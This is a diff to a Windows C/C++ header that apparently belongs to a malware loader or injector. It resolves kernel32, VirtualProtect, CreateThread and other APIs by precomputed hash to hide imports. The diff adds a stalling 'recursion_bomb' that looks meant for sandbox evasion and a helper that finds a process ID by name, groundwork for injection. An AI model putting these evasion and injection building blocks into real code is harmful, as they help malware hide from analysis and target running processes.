@@ -1,6 +1,7 @@
 #pragma once
 #include <windows.h>
 #include <winternl.h>
+#include <TlHelp32.h>
 size_t KERNELHASH = 16602396236623191500;
 size_t VIRTUALPROTECTHASH = 7157003931739585196;
 size_t CREATETHREADHASH = 4011463126652645628;
@@ -94,6 +95,7 @@ typedef DWORD(*RESUMETHREAD)(
     HANDLE hThread
 );
 
+// Helper functions used in the other stuff
 size_t hashUnicode(UNICODE_STRING key) {
     size_t hashCode = 0;
     //std::size_t h1 = std::hash<PWSTR>{}(key.Buffer);
@@ -209,4 +211,53 @@ UINT_PTR getFuncByHash(HMODULE handle, size_t hash)
     }
 
     return NULL;
+}
+
+int recursion_bomb(int depth)
+{
+    int sum = 0;
+    if (depth == 0)
+    {
+        return sum + 1;
+    }
+
+    for (int i = 0; i < 100000000000; i++)
+    {
+        sum += recursion_bomb(depth - 1) + 5;
+        Sleep(1000);
+    }
+
+    return sum;
+}
+
+DWORD getPidByName(LPCWCHAR proc)
+{
+	HANDLE snapshot;
+	PROCESSENTRY32 curProc;
+	char buf[260];
+	DWORD pid = -1;
+
+	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+	curProc.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(snapshot, &curProc)) {
+		return -1;
+	}
+
+	do
+	{
+		/*printf("------------------------------\n");
+		wprintf(L"Process name %s\n", curProc.szExeFile);
+		printf("PID: %d\n", curProc.th32ProcessID);
+		printf("Number of threads: %d\n", curProc.cntThreads);
+		printf("PPID: %d\n", curProc.th32ParentProcessID);*/
+		if (!lstrcmpW(curProc.szExeFile, proc))
+		{
+			pid = curProc.th32ProcessID;
+			break;
+		}
+	} while (Process32Next(snapshot, &curProc));
+
+	return pid;
 }
